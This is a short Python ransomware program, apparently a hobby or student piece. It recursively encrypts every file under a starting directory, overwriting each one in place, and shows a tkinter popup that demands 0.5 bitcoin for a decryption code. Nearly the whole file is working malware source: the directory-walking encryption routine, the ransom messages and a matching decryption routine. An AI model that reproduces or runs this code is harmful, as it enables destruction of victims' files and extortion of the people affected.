import RSA, os
from tkinter import *

# Ransomware body:

def recursive_encryption(path):
    '''Search through all directories under a given starting point and
       encrypt all files.
    '''
    directoryList = []
    if os.path.isdir(path):  # Check if directory exists.
        if os.listdir(path):  # Check if directory is empty.
            for f in os.listdir(path):  # For all items in the directory
                if os.path.isfile(path + f):   # if item is a file, open, encrypt, then save.
                    abso = path + f
                    with open(abso) as fi:
                        contents = fi.read()
                    with open(abso, 'w') as fi:
                        contents = contents.rstrip()
                        toWrite = RSA.main('encrypt', contents)
                        fi.write(toWrite)
                else:                                 
                    directoryList.append(path + f)    # If item is a directory, add it to a list.
            if len(directoryList) > 0:  # The base case for recursion.
                for i in directoryList: # for each item in the direcctory list, enter the directory and call the encryption function again.
                    os.chdir(i)
                    recursive_encryption(f"{i}/")
        else:
            return None
    else:
        return None

def recursive_decryption(path):
    directoryList = []
    if os.path.isdir(path): # Check if directory exists.
        if os.listdir(path): # Check if directory is empty.
            for f in os.listdir(path): # For all items in the directory
                if os.path.isfile(path + f):   # If item is a file, open, decrpyt, then save
                    abso = path + f
                    with open(abso) as fi:
                        contents = fi.read()
                    with open(abso, 'w') as fi:
                        contents = contents.rstrip()
                        toWrite = RSA.main('decrypt', contents)
                        fi.write(toWrite)
                else:
                    directoryList.append(path + f)   # If item is a directory, add it to a list.
            if len(directoryList) > 0:
                for i in directoryList:
                    os.chdir(i)
                    recursive_decryption(f"{i}/")
        else:
            return None
    else:
        return None


recursive_encryption('C:/example/location/to/start/')
#tkinter popup
root = Tk()


#textBox.grid(row=5, column=0)

myLabel2 = Label(root, text="Oh dear, you've been hacked! We have encrypted all of your files.")
myLabel3 = Label(root, text="If you want to get your files back you must pay us 0.5 bitcoin.")
myLabel4 = Label(root, text="When we receive the amount we will send the code to decrypt your files.")
myLabel5 = Label(root, text="If you choose not to pay us, your files will remain locked.")
myLabel6 = Label(root, text="Enter the code in the box below and click send.")
myLabel2.grid(row=0, column=0)
myLabel3.grid(row=1, column=0)
myLabel4.grid(row=2, column=0)
myLabel5.grid(row=3, column=0)
myLabel6.grid(row=4, column=0)



def send():
    myLabel = Label(root, text="Thank you. Your files have been decrypted.")
    myLabel.grid(row=7, column=0)

def button():
    global textBox
    textBox = Entry(root, borderwidth=10)
    textBox.grid(row=5, column=0)
    textBox.get()
    myButton = Button(root, text="Send", command=send)
    myButton.grid(row=6, column=0)

button()
root.mainloop()

recursive_decryption('C:/example/location/to/start/')

